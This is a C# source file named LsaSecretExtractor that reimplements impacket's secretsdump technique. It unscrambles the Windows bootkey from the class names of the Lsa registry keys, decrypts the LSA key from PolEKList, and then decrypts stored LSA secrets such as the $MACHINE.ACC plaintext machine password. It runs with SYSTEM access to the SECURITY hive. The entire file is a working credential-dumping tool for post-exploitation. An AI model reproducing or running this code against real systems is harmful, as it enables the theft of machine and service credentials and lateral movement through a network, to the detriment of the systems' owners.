using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace LsaSecretExtractor
{
    /// <summary>
    /// Decrypts a modern (Vista+/AES) LSA secret blob to recover the plaintext machine password,
    /// mirroring impacket secretsdump:
    ///   1) bootkey  := unscramble(class-names of HKLM\SYSTEM\CCS\Control\Lsa\{JD,Skew1,GBG,Data})
    ///   2) LSA key  := decrypt(HKLM\SECURITY\Policy\PolEKList) with bootkey
    ///   3) secret   := decrypt(the $MACHINE.ACC LSA_SECRET blob) with the LSA key
    /// LsaRetrievePrivateData returns the still-encrypted LSA_SECRET blob on modern Windows,
    /// so we perform the decryption ourselves. Requires SYSTEM (registry access to SECURITY hive).
    /// </summary>
    internal static class LsaCrypto
    {
        private static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
        private const int KEY_READ = 0x20019;
        private const int ERROR_SUCCESS = 0;

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int RegOpenKeyEx(IntPtr hKey, string subKey, int options, int samDesired, out IntPtr phkResult);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
        private static extern int RegQueryInfoKey(
            IntPtr hKey, StringBuilder lpClass, ref uint lpcchClass, IntPtr lpReserved,
            out uint lpcSubKeys, out uint lpcbMaxSubKeyLen, out uint lpcbMaxClassLen,
            out uint lpcValues, out uint lpcbMaxValueNameLen, out uint lpcbMaxValueLen,
            out uint lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int RegQueryValueEx(IntPtr hKey, string lpValueName, IntPtr lpReserved,
            out uint lpType, byte[] lpData, ref uint lpcbData);

        [DllImport("advapi32.dll")]
        private static extern int RegCloseKey(IntPtr hKey);

        // Permutation used to unscramble the syskey/bootkey from the four class names.
        private static readonly int[] BootKeyPermutation = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };

        public static byte[] GetBootKey()
        {
            string[] names = { "JD", "Skew1", "GBG", "Data" };
            var scrambled = new StringBuilder();
            foreach (string n in names)
                scrambled.Append(GetKeyClass(@"SYSTEM\CurrentControlSet\Control\Lsa\" + n));

            byte[] scrambledBytes = HexToBytes(scrambled.ToString());
            if (scrambledBytes.Length != 16)
                throw new Exception("Unexpected bootkey length: " + scrambledBytes.Length);

            byte[] bootKey = new byte[16];
            for (int i = 0; i < 16; i++)
                bootKey[i] = scrambledBytes[BootKeyPermutation[i]];
            return bootKey;
        }

        public static byte[] GetLsaKey(byte[] bootKey)
        {
            byte[] polEkList = GetKeyValue(@"SECURITY\Policy\PolEKList", null);
            if (polEkList == null || polEkList.Length < 32)
                throw new Exception("PolEKList not found or too short (non-AES LSA not supported).");

            // LSA_SECRET: Version(4) EncKeyId(16) EncAlgorithm(4) Flags(4) EncryptedData(...)
            byte[] encryptedData = Slice(polEkList, 28, polEkList.Length - 28);
            byte[] tmpKey = Sha256Loop(bootKey, Slice(encryptedData, 0, 32), 1000);
            byte[] plain = AesEcbDecrypt(tmpKey, Slice(encryptedData, 32, encryptedData.Length - 32));

            // LSA_SECRET_BLOB: Length(4) Unknown(12) Secret(Length)
            int length = BitConverter.ToInt32(plain, 0);
            byte[] secret = Slice(plain, 16, length);
            // The current LSA key is 32 bytes located at offset 52 of the secret material.
            return Slice(secret, 52, 32);
        }

        public static byte[] DecryptLsaSecretBlob(byte[] lsaKey, byte[] encryptedSecret)
        {
            if (encryptedSecret == null || encryptedSecret.Length < 28)
                throw new Exception("Encrypted secret blob too short.");

            byte[] encryptedData = Slice(encryptedSecret, 28, encryptedSecret.Length - 28);
            byte[] tmpKey = Sha256Loop(lsaKey, Slice(encryptedData, 0, 32), 1000);
            byte[] plain = AesEcbDecrypt(tmpKey, Slice(encryptedData, 32, encryptedData.Length - 32));

            int length = BitConverter.ToInt32(plain, 0);
            return Slice(plain, 16, length);
        }

        /// <summary>
        /// Full pipeline: read the encrypted CurrVal of an LSA secret from the registry and decrypt
        /// it to plaintext using the bootkey-derived LSA key. Must be called while impersonating SYSTEM.
        /// </summary>
        public static byte[] GetSecretPlaintext(string secretName)
        {
            byte[] bootKey = GetBootKey();
            byte[] lsaKey = GetLsaKey(bootKey);
            byte[] currVal = GetKeyValue(@"SECURITY\Policy\Secrets\" + secretName + @"\CurrVal", null);
            if (currVal == null)
                throw new Exception("Secret '" + secretName + "' CurrVal not found in registry.");
            return DecryptLsaSecretBlob(lsaKey, currVal);
        }

        #region registry helpers

        private static string GetKeyClass(string subKeyPath)
        {
            IntPtr hKey;
            int rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKeyPath, 0, KEY_READ, out hKey);
            if (rc != ERROR_SUCCESS)
                throw new Exception("RegOpenKeyEx('" + subKeyPath + "') failed: " + rc);
            try
            {
                var classBuffer = new StringBuilder(256);
                uint classLen = (uint)classBuffer.Capacity;
                uint a, b, c, d, e, f, g;
                rc = RegQueryInfoKey(hKey, classBuffer, ref classLen, IntPtr.Zero,
                    out a, out b, out c, out d, out e, out f, out g, IntPtr.Zero);
                if (rc != ERROR_SUCCESS)
                    throw new Exception("RegQueryInfoKey('" + subKeyPath + "') failed: " + rc);
                return classBuffer.ToString();
            }
            finally
            {
                RegCloseKey(hKey);
            }
        }

        private static byte[] GetKeyValue(string subKeyPath, string valueName)
        {
            IntPtr hKey;
            int rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKeyPath, 0, KEY_READ, out hKey);
            if (rc != ERROR_SUCCESS)
                throw new Exception("RegOpenKeyEx('" + subKeyPath + "') failed: " + rc);
            try
            {
                uint type;
                uint size = 0;
                rc = RegQueryValueEx(hKey, valueName, IntPtr.Zero, out type, null, ref size);
                if (rc != ERROR_SUCCESS || size == 0)
                    return null;

                byte[] data = new byte[size];
                rc = RegQueryValueEx(hKey, valueName, IntPtr.Zero, out type, data, ref size);
                if (rc != ERROR_SUCCESS)
                    throw new Exception("RegQueryValueEx('" + subKeyPath + "') failed: " + rc);
                return data;
            }
            finally
            {
                RegCloseKey(hKey);
            }
        }

        #endregion

        #region crypto helpers

        private static byte[] Sha256Loop(byte[] key, byte[] value, int rounds)
        {
            using (var sha = SHA256.Create())
            {
                sha.TransformBlock(key, 0, key.Length, null, 0);
                for (int i = 0; i < rounds; i++)
                {
                    if (i == rounds - 1)
                        sha.TransformFinalBlock(value, 0, value.Length);
                    else
                        sha.TransformBlock(value, 0, value.Length, null, 0);
                }
                return sha.Hash;
            }
        }

        private static byte[] AesEcbDecrypt(byte[] key, byte[] data)
        {
            // impacket decrypts each 16-byte block with AES-256-CBC IV=0 re-init => equivalent to ECB.
            int padded = (data.Length + 15) / 16 * 16;
            if (padded != data.Length)
            {
                byte[] tmp = new byte[padded];
                Array.Copy(data, tmp, data.Length);
                data = tmp;
            }
            using (var aes = new AesCryptoServiceProvider())
            {
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                aes.Key = key;
                using (var dec = aes.CreateDecryptor())
                    return dec.TransformFinalBlock(data, 0, data.Length);
            }
        }

        private static byte[] Slice(byte[] data, int offset, int length)
        {
            if (offset < 0) offset = 0;
            if (length < 0) length = 0;
            if (offset + length > data.Length) length = data.Length - offset;
            byte[] r = new byte[length];
            Array.Copy(data, offset, r, 0, length);
            return r;
        }

        private static byte[] HexToBytes(string hex)
        {
            byte[] b = new byte[hex.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return b;
        }

        #endregion
    }
}
